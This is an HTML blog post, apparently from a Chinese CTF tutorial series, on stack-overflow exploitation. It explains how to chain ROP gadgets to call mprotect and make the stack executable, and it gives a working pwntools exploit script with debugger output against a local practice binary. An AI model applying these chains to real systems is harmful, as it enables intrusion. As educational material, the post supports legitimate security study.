@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>二进制安全之栈溢出（七） - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="二进制安全之栈溢出（七） - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/782/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>二进制安全之栈溢出（七）</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2017-10-26 12:46"><i class="iconfont icon-date"></i>2017-10-26 12:46</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>本篇文章会使用一个稍复杂的 gadget，同时解决 gadget 含有换行符带来的问题。</p>
+
+<h3 id="mprotect">mprotect</h3>
+
+<p>之前使用 <code class="highlighter-rouge">vmmap</code> 命令的时候会注意到有一列是内存地址的权限，<code class="highlighter-rouge">rwx</code> 和文件系统的一致，NX 不可执行就是没有 <code class="highlighter-rouge">x</code> 权限，当然这不是绝对的，使用 <code class="highlighter-rouge">mprotect</code> 可以修改这个权限，这样的话，就可以在栈上执行 shellcode 了。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r-xp	/home/virusdefender/Desktop/pwn/new/vuln
+0x00600000         0x00601000         r--p	/home/virusdefender/Desktop/pwn/new/vuln
+0x00601000         0x00602000         rw-p	/home/virusdefender/Desktop/pwn/new/vuln
+0x00602000         0x00623000         rw-p	[heap]
+0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7bcd000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dcd000 0x00007ffff7dd1000 r--p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p	mapped
+0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7fda000 0x00007ffff7fdd000 rw-p	mapped
+0x00007ffff7ff6000 0x00007ffff7ff8000 rw-p	mapped
+0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+</code></pre>
+</div>
+
+<p>函数原型是 <code class="highlighter-rouge">int mprotect(void *addr, size_t len, int prot);</code>，<code class="highlighter-rouge">addr</code> 是内存地址开头，<code class="highlighter-rouge">len</code> 是长度，<code class="highlighter-rouge">prot</code> 就是权限位，在 manpage 上有 <code class="highlighter-rouge">PROT_WRITE</code>、<code class="highlighter-rouge">PROT_EXEC</code>、<code class="highlighter-rouge">PROT_READ</code> 等几项，权限是位运算之后的数字，根据宏定义， <code class="highlighter-rouge">rwx</code> 就是 <code class="highlighter-rouge">0x1 | 0x2 | 0x4</code>。</p>
+
+<p>需要注意的是 <code class="highlighter-rouge">mprotect</code> 修改的内存的起始地址必须和内存页对齐，范围也必须是内存页大小的整数倍，否则系统调用会失败，详见 manpage。<code class="highlighter-rouge">getconf PAGESIZE</code> 可以获取内存页大小，默认是 <code class="highlighter-rouge">4096</code>。</p>
+
+<h3 id="rop-构造-gadget">ROP 构造 gadget</h3>
+
+<p><code class="highlighter-rouge">mprotecct</code> 有三个参数，就会使用 <code class="highlighter-rouge">rdi, rsi, rdx</code> 寄存器。如果想让整个栈区可执行的话，在 <code class="highlighter-rouge">vmmap</code> 可以获取栈区的开头和结尾地址，那三个寄存器的值就分别是 <code class="highlighter-rouge">0x00007ffffffde000</code>、<code class="highlighter-rouge">0x00007ffffffff000 - 0x00007ffffffde000</code> 和 <code class="highlighter-rouge">0x1 | 0x2 | 0x4</code>。然后在调用 <code class="highlighter-rouge">mproect</code> 系统系统调用的时候，<code class="highlighter-rouge">rax</code> 寄存器是系统调用号 <code class="highlighter-rouge">0xa</code>。所以按照之前的文章，只要能找到下面这些 gadget 就可以了。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>pop rdi; ret;
+pop rsi; ret;
+pop rdx; ret;
+pop rax; ret;
+syscall; ret;
+</code></pre>
+</div>
+
+<p>但是有些事情总不会太直接，能在二进制文件中只能找到两个 gadget，其中第二个有一个寄存器是没用的，但是并不影响。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>➜  new ROPgadget --binary vuln | grep "pop rdi"
+0x0000000000400803 : pop rdi ; ret
+
+➜  new ROPgadget --binary vuln | grep "pop rsi"
+0x0000000000400801 : pop rsi ; pop r15 ; ret
+</code></pre>
+</div>
+
+<p>这个时候可以去 glibc 中找了。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code># 这个文件处理比较慢，可以先保存下结果
+➜  new ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 &gt; libc.gadget
+
+➜  new grep "pop rdx ; ret" libc.gadget
+0x0000000000001b92 : pop rdx ; ret
+
+➜  new grep "pop rax ; ret" libc.gadget
+0x0000000000033542 : add al, ch ; pop rax ; ret
+
+➜  new grep "syscall ; ret" libc.gadget
+0x00000000000bc375 : syscall ; ret
+</code></pre>
+</div>
+
+<p>如果已知 glibc 的加载基址，使用基址加上上面的地址就可以了，这个基址目前可以在 <code class="highlighter-rouge">vmmap</code> 或者 <code class="highlighter-rouge">ldd</code> 中看到。</p>
+
+<h3 id="0xa">0xa</h3>
+
+<p>如果按照上面的说法直接写 shellcode，会发现栈上的数据并不全，再认真的调试就会发现，shellcode 中含有 <code class="highlighter-rouge">0xa</code>，也就是 <code class="highlighter-rouge">\n</code> 的 ascii，因为 shellcode 是 gets 读入的，所以就会在这里被截断。</p>
+
+<p>我选择了先 <code class="highlighter-rouge">pop rax</code> 为 <code class="highlighter-rouge">0x9</code>，然后 <code class="highlighter-rouge">add rax, 1； ret</code> 的 gadget。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>➜  new grep "add rax, 1 ; ret" libc.gadget
+0x00000000000abf40 : add rax, 1 ; ret
+</code></pre>
+</div>
+
+<h3 id="shellcode">shellcode</h3>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">student</span> <span class="o">=</span> <span class="mh">0x7fffffffe2f0</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"1925</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">cat</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s">"flag"</span><span class="p">),</span> <span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">cat</span> <span class="o">+</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x7fffffffe348</span> <span class="o">-</span> <span class="n">student</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">cat</span><span class="p">))</span>
+
+<span class="c"># pop rdi; ret</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400803</span><span class="p">)</span>
+<span class="c"># mprotect arg1 addr -&gt; rdi</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00007ffffffde000</span><span class="p">)</span>
+
+<span class="c"># pop rsi; pop r15; ret;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400801</span><span class="p">)</span>
+<span class="c"># mprotect arg2 size -&gt; rsi</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00007ffffffff000</span> <span class="o">-</span> <span class="mh">0x00007ffffffde000</span><span class="p">)</span>
+<span class="c"># -&gt; r15</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">libc_base</span> <span class="o">=</span> <span class="mh">0x00007ffff7a0d000</span>
+
+<span class="c"># pop rdx; ret;</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000001b92</span><span class="p">)</span>
+<span class="c"># mprotect arg3 rwx -&gt; rdx</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span> <span class="o">|</span> <span class="mh">0x2</span> <span class="o">|</span> <span class="mh">0x4</span><span class="p">)</span>
+
+<span class="c"># pop rax; ret</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000033544</span><span class="p">)</span>
+<span class="c"># -&gt; rax</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+
+<span class="c"># add rax, 1; ret</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x00000000000abf40</span><span class="p">)</span>
+
+<span class="c"># syscalll; ret</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x00000000000bc375</span><span class="p">)</span>
+
+<span class="c"># shellcode</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">student</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">shellcode</span>
+</code></pre>
+</div>
+
+<p>运行后可以看到栈区的内存已经是 <code class="highlighter-rouge">rwx</code> 的权限了。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
+</code></pre>
+</div>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=二进制安全之栈溢出（七）&article_id=/index.php/archives/782/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
